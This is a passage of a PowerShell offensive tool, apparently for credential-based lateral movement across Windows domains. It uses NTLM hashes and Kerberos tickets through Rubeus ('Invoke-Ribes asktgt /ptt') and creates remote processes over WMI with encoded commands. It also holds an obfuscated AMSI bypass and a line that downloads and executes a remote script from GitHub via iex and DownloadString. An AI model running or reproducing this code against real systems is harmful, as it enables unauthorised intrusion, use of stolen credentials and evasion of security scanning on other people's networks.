			$WMITargets | ForEach-Object {
					
				$commandtoencode = "net share $eightrandom$ /delete; del c:\Users\Public\$eightrandom\ -Recurse"
				
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
				
				Remove-SMBMapping * -Force
				
			}
		}
	
	}
	
	elseif($HASHorPassword -eq "HASH"){
	
		if($Username.Contains(".\")){
		
			$loggedinusershashdeletejob = $WMITargets | ForEach-Object {
				
				$commandtoencode = "net share $eightrandom$ /delete; del c:\Users\Public\$eightrandom -Recurse"
			
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				Start-Job -ScriptBlock {
					param($pwd, $base64command, $SMBExecUsername, $DomainHASH, $WMITarget)
					S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Exc.ps1')
					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command"
				} -ArgumentList $pwd, $base64command, $SMBExecUsername, $DomainHASH, $_
			}
			
			Wait-Job $loggedinusershashdeletejob > $null
			
			Remove-Job $loggedinusershashdeletejob > $null
		
		}
		
		else{
			
			if($DomainHASH.length -eq 32) {
				
				if($jtargetdomain){
					$RubUsername = $Username.Split("\")[1].Trim()
					klist purge > $null
					Invoke-Ribes -Command "asktgt /user:$RubUsername /rc4:$DomainHASH /domain:$jtargetdomain /ptt" > $null
				}
				
				else{
					$RubUsername = $Username.Split("\")[1].Trim()
					klist purge > $null
					Invoke-Ribes -Command "asktgt /user:$RubUsername /rc4:$DomainHASH /domain:$jcurrentdomain /ptt" > $null
				}
			}
			
			elseif($DomainHASH.length -eq 64) {
				
				if($jtargetdomain){
					$RubUsername = $Username.Split("\")[1].Trim()
					klist purge > $null
					Invoke-Ribes -Command "asktgt /user:$RubUsername /domain:$jtargetdomain /aes256:$DomainHASH /opsec /ptt" > $null
				}
				
				else{
					$RubUsername = $Username.Split("\")[1].Trim()
					klist purge > $null
					Invoke-Ribes -Command "asktgt /user:$RubUsername /aes256:$DomainHASH /domain:$jcurrentdomain /opsec /ptt" > $null
				}
			}
			
			$WMITargets | ForEach-Object {
				
				$commandtoencode = "net share $eightrandom$ /delete; del c:\Users\Public\$eightrandom\ -Recurse"
				
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
				
				Remove-SMBMapping * -Force
				
			}
		
		}
	
	}
	
	elseif($HASHorPassword -eq "Ticket"){
		
		Invoke-Ribes -Command "ptt /ticket:$DomainRubTicket" > $null
	
		$WMITargets | ForEach-Object {
				
			$commandtoencode = "net share $eightrandom$ /delete; del c:\Users\Public\$eightrandom\ -Recurse"
			
			$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
			
			$processCommand = "powershell.exe -ep bypass -enc $base64command"
			
			Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
			
			Remove-SMBMapping * -Force
			
		}
	
	}
	
}

else{

	$WMITargets | ForEach-Object {
				
		$commandtoencode = "net share $eightrandom$ /delete; del c:\Users\Public\$eightrandom\ -Recurse"
		
		$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
		
		$processCommand = "powershell.exe -ep bypass -enc $base64command"
		
		Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
		
		Remove-SMBMapping * -Force
		
	}

}
Write-Host "Done..."
Write-Host ""

# Restore previous ticket

if($UserName){
	if($Username.Contains(".\")){}
	else{
		klist purge > $null
		Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
	}
}

else{}

################# Assign $null to all variables
$WMITargets | ForEach-Object {Set-Variable -Name $_ -Value $null}
$AdminAccessComputers = $null
$AdminAccessComputersCommand = $null
$AdminAccessComputersString = $null
$admins = $null
$AllAdminGroups = $null
$AllAdminGroupsUsers = $null
$AllAdminGroupsUsersList = $null
$AllAdminUsers = $null
$allcomputerjobs = $null
$AllComputersEnabled = $null
$allLogResults = $null
$ArrayOfHosts = $null
$base64command = $null
$commandtoencode = $null
$Computer = $null
$ComputerFile = $null
$Computerfile = $null
$ComputerHostname = $null
$ComputerName = $null
$computerpathjobs = $null
$Computers = $null
$cred = $null
$current = $null
$currentuserpassword = $null
$DataToHash = $null
$deletejob = $null
$DomainAdmins = $null
$DomainHASH = $null
$DomainRubTicket = $null
$dumpinghashesjob = $null
$eightrandom = $null
$EnterpriseAdmins = $null
$HashBytes = $null
$HashedPassword = $null
$HASHorPassword = $null
$HashString = $null
$hostname = $null
$jcurrentdomain = $null
$jtargetdomain = $null
$line = $null
$Lines = $null
$LogComputerName = $null
$LoggedInUsers = $null
$loggedinusershashdeletejob = $null
$loggedinusershashjob = $null
$loggedinusershashretrievejob = $null
$loggedinuserspassdeletejob = $null
$loggedinuserspassretrievejob = $null
$LoggedUsers = $null
$LoggedUsersFileOutput = $null
$loggedusersfiles = $null
$LogObject = $null
$logresultsbytes = $null
$logresultsdecoded = $null
$LogSessionState = $null
$LogUserName = $null
$matchFound = $null
$NoResolveAdminAccess = $null
$objSearcher = $null
$ourerror = $null
$outputFile = $null
$Password = $null
$processCommand = $null
$progress = $null
$reachable_hosts = $null
$result = $null
$retrievejob = $null
$retrieveticketsjob = $null
$ResolveObject = $null
$RubUsername = $null
$SecPassword = $null
$serverjobs = $null
$Servers = $null
$ServersEnabled = $null
$SMBAdminAccessOn = $null
$SMBAliveComputer = $null
$SMBAliveComputers = $null
$SMBComputer = $null
$SMBComputers = $null
$SMBExecDomain = $null
$SMBExecUsername = $null
$SMBServer = $null
$SMBServers = $null
$SMBTargetsPath = $null
$SMBWorkstation = $null
$SMBWorkstations = $null
$target = $null
$targetlist = $null
$TargetsPath = $null
$targetticketfile = $null
$Tasks = $null
$TestConnectionName = $null
$TestConnectionNames = $null
$textFile = $null
$TicketsLogObject = $null
$total = $null
$Username = $null
$UserTargets = $null
$WMIAdminAccess = $null
$WMIAdminAccessIPs = $null
$WMITarget = $null
$WMITargets = $null
$workstationjobs = $null
$Workstations = $null
$WorkstationsEnabled = $null
